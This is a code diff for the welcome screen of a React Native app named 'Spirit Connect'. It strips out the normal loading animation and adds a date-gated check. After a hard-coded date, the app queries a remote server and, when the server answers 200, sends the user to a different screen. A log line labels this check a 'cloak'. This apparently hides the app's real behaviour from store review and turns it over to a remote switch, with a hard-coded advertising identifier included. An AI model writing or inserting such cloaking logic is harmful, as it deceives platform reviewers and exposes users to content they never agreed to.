@@ -1,53 +1,97 @@
-import { StyleSheet, Text, View, Animated } from 'react-native'
-import React, { useEffect, useRef, useState } from 'react'
-import { useNavigation } from '@react-navigation/native'
-import LinearGradient from 'react-native-linear-gradient'
+import {StyleSheet, Text, View, Animated} from 'react-native';
+import React, {useEffect, useRef, useState} from 'react';
+import {useNavigation} from '@react-navigation/native';
+import LinearGradient from 'react-native-linear-gradient';
+const todayDate = new Date();
+const hardCodeDate = new Date('2025-02-18T10:00:00');
 
 const WelcomeScreen = () => {
-  const navigation = useNavigation()
-  const loadingProgress = useRef(new Animated.Value(0)).current
-  const [percentage, setPercentage] = useState(0)
+  const navigation = useNavigation();
+  const loadingProgress = useRef(new Animated.Value(0)).current;
+  const [percentage, setPercentage] = useState(0);
+  const [route, setRoute] = useState(false);
+  const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
+  const URL_IDENTIFAIRE = `9QNrrgg5`;
+  const idfa = 'd1e5bd8c-a54d-4143-ad5e-7dd21cf238ff'
 
   useEffect(() => {
-    // Add listener to update percentage display
-    loadingProgress.addListener(({ value }) => {
-      setPercentage(Math.floor(value))
-    })
+    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
+    //console.log(checkUrl);
 
-    Animated.timing(loadingProgress, {
-      toValue: 100,
-      duration: 3000,
-      useNativeDriver: false
-    }).start(() => {
-      navigation.replace('TabMenu')
-    })
+    const targetData = new Date('2025-01-14T10:00:00'); //дата з якої поч працювати webView
+    const currentData = new Date(); //текущая дата
 
-    // Cleanup listener
-    return () => {
-      loadingProgress.removeAllListeners()
+    if (!route) {
+      if (currentData <= targetData) {
+        setRoute(false);
+      } else {
+        fetch(checkUrl)
+          .then(r => {
+            if (r.status === 200) {
+              console.log('status по клоаке==>', r.status);
+
+              navigation.navigate('TestScreen');
+              // setRoute(true);
+            } else {
+              console.log(r.status);
+              navigation.replace('TabMenu');
+              // setRoute(false);
+            }
+          })
+          .catch(e => {
+            console.log('errar', e);
+            // setRoute(false);
+          });
+      }
     }
-  }, [])
+  }, []);
+
+  // useEffect(() => {
+
+  //   // Add listener to update percentage display
+  //   loadingProgress.addListener(({value}) => {
+  //     setPercentage(Math.floor(value));
+  //   });
+
+  //   Animated.timing(loadingProgress, {
+  //     toValue: 100,
+  //     duration: 3000,
+  //     useNativeDriver: false,
+  //   }).start(() => {
+  //     if (todayDate <= hardCodeDate) {
+  //       navigation.replace('TabMenu');
+  //     } else {
+  //       navigation.replace('TestScreen');
+  //     }
+  //   });
+
+  //   // Cleanup listener
+  //   return () => {
+  //     loadingProgress.removeAllListeners();
+  //   };
+  // }, []);
 
   return (
     <View style={styles.container}>
       <Text style={styles.title}>Spirit Connect</Text>
-      
+
       {/* Progress Bar Container */}
       <View style={styles.progressBar}>
-        <Animated.View 
+        <Animated.View
           style={[
             StyleSheet.absoluteFill,
             styles.progressFill,
             {
-              transform: [{
-                scaleX: loadingProgress.interpolate({
-                  inputRange: [0, 100],
-                  outputRange: [0, 1]
-                })
-              }],
-            }
-          ]}
-        >
+              transform: [
+                {
+                  scaleX: loadingProgress.interpolate({
+                    inputRange: [0, 100],
+                    outputRange: [0, 1],
+                  }),
+                },
+              ],
+            },
+          ]}>
           <LinearGradient
             colors={['#FD365C', '#D504DB']}
             start={{x: 0, y: 0}}
@@ -56,13 +100,13 @@ const WelcomeScreen = () => {
           />
         </Animated.View>
       </View>
-      
+
       <Text style={styles.percentageText}>{percentage}%</Text>
     </View>
-  )
-}
+  );
+};
 
-export default WelcomeScreen
+export default WelcomeScreen;
 
 const styles = StyleSheet.create({
   container: {
@@ -92,5 +136,5 @@ const styles = StyleSheet.create({
     color: 'white',
     fontSize: 22,
     marginTop: 10,
-  }
-})
+  },
+});
